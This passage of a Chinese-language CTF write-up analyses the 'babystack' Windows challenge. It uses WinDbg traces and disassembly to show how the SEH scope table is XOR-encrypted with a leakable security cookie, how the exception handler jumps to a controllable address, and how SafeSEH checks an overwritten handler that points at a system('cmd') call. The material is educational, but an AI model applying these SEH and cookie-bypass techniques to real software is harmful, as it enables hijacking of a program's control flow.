    0:000> dd ebp-8 l1//加密后的scopetable
    001efa24  d352acb2
我们可以看到，加密的方法是将scopetable指针和security cookie做了一个亦或运算。
    .text:004010CC                 mov     eax, ___security_cookie
    .text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax
而 security cookie 是一个全局变量存放在 babystack+0x4004 的位置，之前我们已经聊到 babystack
可以泄露任意地址值，因此 security cookie 是完全可以泄露出来的。
    .data:00404004 ___security_cookie dd 0BB40E64Eh        ; DATA XREF: sub_401060+6r
    .data:00404004                                         ; sub_4010B0+1Cr ...
接下来，我们就要来看一看这个Scope Table了，首先指向它的指针是在ebp-8的位置存放的，来看一下在异或运算前栈的情况。
    0:000> dd ebp-8
    001efa24  00263688 fffffffe 001efa74
这个值是在 `sub_4010b0` 函数入口处被推入栈中的。
    .text:004010B0                 push    ebp
    .text:004010B1                 mov     ebp, esp
    .text:004010B3                 push    0FFFFFFFEh//先推入0xfffffffe
    .text:004010B5                 push    offset stru_403688//推入scope table
    .text:004010BA                 push    offset sub_401460
scope table 指针指向的是一个 stru_403688 结构，是一个全局变量，直接来看一下这个结构。
    .rdata:00403688 stru_403688     dd 0FFFFFFE4h           ; GSCookieOffset
    .rdata:00403688                                         ; DATA XREF: sub_4010B0+5o
    .rdata:00403688                 dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4010B0
    .rdata:00403688                 dd 0FFFFFF20h           ; EHCookieOffset
    .rdata:00403688                 dd 0                    ; EHCookieXOROffset
    .rdata:00403688                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
    .rdata:00403688                 dd offset loc_401348    ; ScopeRecord.FilterFunc
    .rdata:00403688                 dd offset loc_40134E    ; ScopeRecord.HandlerFunc
其实关于 Scope table 的描述在这里已经很清楚了，我们直接来看一下实际情况下 scope table 表。
    0:000> dd 00263688
    00263688  ffffffe4 00000000 ffffff20 00000000
    00263698  fffffffe 00261348 0026134e 00000000
    002636a8  fffffffe 00000000 ffffffcc 00000000
    002636b8  fffffffe 002616ad 002616c1 00000000
接下来我们就需要来看看这个 scope table 到底我们该怎么利用，这个涉及到 `_except_handler4` 异常处理函数，在
babystack 中，异常处理函数中会调用 `VCRUNTIME140!_except_handler4_common`。
    0:000> t
    eax=00000000 ebx=00000000 ecx=01101460 edx=770b6d8d esi=00000000 edi=00000000
    eip=01101fe2 esp=0012f8b8 ebp=0012f8d4 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babystack+0x1fe2:
    01101fe2 ff2538301001    jmp     dword ptr [babystack+0x3038 (01103038)] ds:0023:01103038={VCRUNTIME140!_except_handler4_common (651fb2f0)}
    0:000> p
    eax=00000000 ebx=00000000 ecx=01101460 edx=770b6d8d esi=00000000 edi=00000000
    eip=651fb2f0 esp=0012f8b8 ebp=0012f8d4 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_except_handler4_common:
    651fb2f0 55              push    ebp
在 `VCRUNTIME140!_except_handler4_common` 函数中，会栈进行很多操作，比如全局栈展开，以前的栈回收等等，而最后会调用
terminal func，也就是 handler function。
    0:000> p
    eax=00000000 ebx=00000000 ecx=00000000 edx=0012ff18 esi=0110134e edi=fffffffe
    eip=651faf58 esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_EH4_TransferToHandler+0x13:
    651faf58 33d2            xor     edx,edx
    0:000> p
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0110134e edi=fffffffe
    eip=651faf5a esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_EH4_TransferToHandler+0x15:
    651faf5a 33ff            xor     edi,edi
    0:000> p
    eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0110134e edi=00000000
    eip=651faf5c esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_EH4_TransferToHandler+0x17:
    651faf5c ffe6            jmp     esi {babystack+0x134e (0110134e)}
也就是说，如果我们可以控制 handler function，就可以通过 jmp esi 来控制 eip 了！
这时候有同学会问，直接把进程函数的地址（也就是刚才提到的函数里有一处 system('cmd') 调用地址）覆盖 seh handler
不行吗？safeseh 是不允许通过的。
    0:000> g//触发异常
    (18f074.18f078): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00000000 ebx=7ffd7000 ecx=de5c2bcc edx=00000009 esi=5ffb6314 edi=00297b60
    eip=000a1272 esp=0028f9d0 ebp=0028fab0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    *** ERROR: Module load completed but symbols could not be loaded for babystack.exe
    babystack+0x1272:
    000a1272 8b08            mov     ecx,dword ptr [eax]  ds:0023:00000000=????????
    0:000> !exchain
    0028faa0: babystack+138d (000a138d)//seh handler被修改成指向system('cmd')
    0028fae8: babystack+1460 (000a1460)
    0028fb34: ntdll!_except_handler4+0 (7708e195)
      CRT scope  0, filter: ntdll!__RtlUserThreadStart+2e (770e790b)
                    func:   ntdll!__RtlUserThreadStart+63 (770e7c80)
    Invalid exception stack at ffffffff
关于 safeseh 的伪代码在我上篇 babyshellcode 文章中已经贴出了，这里不再贴详细代码，关键部分在这里。
    if (handler is in an image)//进入这里
    {        // 在加载模块的进程空间
    if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set)
        return FALSE; // 该标志设置，忽略异常处理，直接返回FALSE
    if (image has a SafeSEH table) // 是否含有SEH表
        if (handler found in the table)
            return TRUE; // 异常处理handle在表中，返回TRUE
        else
            return FALSE; // 异常处理handle不在表中，返回FALSE
首先我们要跳转到 system('cmd') 的地址空间就在当前进程空间中，所以会进入第一个if处理逻辑，随后会检查 safeseh table。
    0:000> p//获取safeseh table
    eax=0028f4d8 ebx=000a138d ecx=0028f4dc edx=770b6c74 esi=0028f580 edi=00000000
    eip=7708f834 esp=0028f4a0 ebp=0028f4e8 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ntdll!RtlIsValidHandler+0x21:
    7708f834 e85c000000      call    ntdll!RtlLookupFunctionTable (7708f895)
    0:000> p
    eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
    eip=7708f839 esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ntdll!RtlIsValidHandler+0x26:
    7708f839 33ff            xor     edi,edi
    0:000> p//eax存放的是当前进程的safeseh表
    eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
    eip=7708f83b esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlIsValidHandler+0x28:
    7708f83b 8945f4          mov     dword ptr [ebp-0Ch],eax ss:0023:0028f4dc=770b5c1c
    0:000> p//如果没有返回0，和0作比较，现在有
    eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
    eip=7708f83e esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlIsValidHandler+0x2b:
    7708f83e 3bc7            cmp     eax,edi
    0:000> p
    eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=0028f580 edi=00000000
    eip=7708f840 esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ntdll!RtlIsValidHandler+0x2d:
    7708f840 0f845bae0500    je      ntdll!RtlIsValidHandler+0x82 (770ea6a1) [br=0]
当然这里是存在 safeseh table 的，最后要在里面寻找 handler，看看当前 seh handler 是否是 safeseh 表中的
handler。
    0:000> p//ebx的值是我们覆盖seh handler指向system('cmd')的地址，在进程空间里
    eax=000a3390 ebx=000a138d ecx=7708f93c edx=7714ec30 esi=00000001 edi=00000000
    eip=7708f85a esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl nz ac po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
    ntdll!RtlIsValidHandler+0x46:
    7708f85a 2b5df0          sub     ebx,dword ptr [ebp-10h] ss:0023:0028f4d8={babystack (000a0000)}//这里用seh handler地址减去进程基址
    ……
    0:000> p